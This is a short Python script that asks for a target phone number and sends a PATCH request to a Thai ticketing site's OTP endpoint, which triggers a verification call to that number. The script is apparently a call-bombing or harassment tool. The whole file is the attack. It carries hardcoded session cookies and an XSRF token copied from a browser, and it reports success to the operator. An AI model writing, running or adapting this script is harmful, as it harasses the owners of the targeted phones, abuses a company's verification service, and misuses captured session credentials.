import requests
import os

os.system("clear")

target = input("[!] Phone > ")
print()

headers = {
	"x-xsrf-token": "bd17f13e09a0b04e80974f5a4baeb688Vvle1p/SOakBf5H2NUkd+UMdYG2rgMxpqetKm44v+ylRfKxajn3rI2PYng6GvZKg53KuW0tUBPDKgLEDkSnWMsiFszMWuGLc893f/wMOGCt841LYUh4SiMo+d1hrH2FL",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
	"content-type": "application/json;charset=UTF-8",
	"accept": "application/json, text/plain, */*",
	"x-requested-with": "XMLHttpRequest",
	"cookie": "_pbjs_userid_consent_data=3524755945110770;_gcl_au=1.1.1355383840.1694822659;_fbp=fb.1.1694822659243.398743871;_ga=GA1.1.849458125.1694822659;G_ENABLED_IDPS=google;_cc_id=9c028e3802ac651cf779a91c8ebfb0ce;panoramaId_expiry=1695427619516;panoramaId=c36788ebfab36fb5a9ef4432152116d53938f87e6d20020e4e14addcdb9ad0d2;panoramaIdType=panoIndiv;cto_bundle=CWRZCF9yd3VxVE1MNFNkNjRBSWdmMXB6ZUolMkYxaTViYkdzQ3JCZXg3UWdZREc2eExKVmtheDk2N3gzQzd2RUNKeWhWUkZvTWplWWVYdkVYeWRXeDdhUnltdXpEcHZFRkxvSUhjcTNoOWJUZ3pKaENRdEhyWmNQaXJodFl5RHhFJTJCYW1tbEc5a3JpZEclMkZSV0pTdDdqRGV6cGFUUVdRaEJCcnRpVlJyRTliSXdZNUVITW8lM0Q;pagesInSession=1;popup_2170=true;popup_2166=true;lang=th;__gads=ID=745f6691c55870c8-2250e6d6e7e30034:T=1694822659:RT=1695204131:S=ALNI_MY6NtsdxPlrmgtqT9uHLMp--eqAKw;__gpi=UID=00000c474ce2ad53:T=1694822659:RT=1695204131:S=ALNI_MZFel_qCljxDcriisT0fVDrjR3zww;_ga_N9T2LF0PJ1=GS1.1.1695204131.7.0.1695204131.0.0.0;adonis-session=369b99e210bfa9c140d0b05d0570f9a9FNzfsPnuMM%2FqnubkpzYCrR6avOsDFBUUUJOHroe%2BpE9vu38cJDY%2BGuY7ogmEnhu%2Bsm38lbzQ3sr1aQMomGuxaoETTt3w0iu3Cu1p9DIzUfuvXDAB2bOoIThqTi1pmt%2BJ;XSRF-TOKEN=bd17f13e09a0b04e80974f5a4baeb688Vvle1p%2FSOakBf5H2NUkd%2BUMdYG2rgMxpqetKm44v%2BylRfKxajn3rI2PYng6GvZKg53KuW0tUBPDKgLEDkSnWMsiFszMWuGLc893f%2FwMOGCt841LYUh4SiMo%2Bd1hrH2FL"
}
res = requests.patch("https://www.theconcert.com/rest/request-otp",headers=headers,json={"lang":"th","channel":"call","digit":4,"country_code":"TH","mobile":target})
if res.status_code == 200:
	print(f"Sent to {target} Successfully!")
else:
	print("กรุณารันใหม่อีกครั้ง")
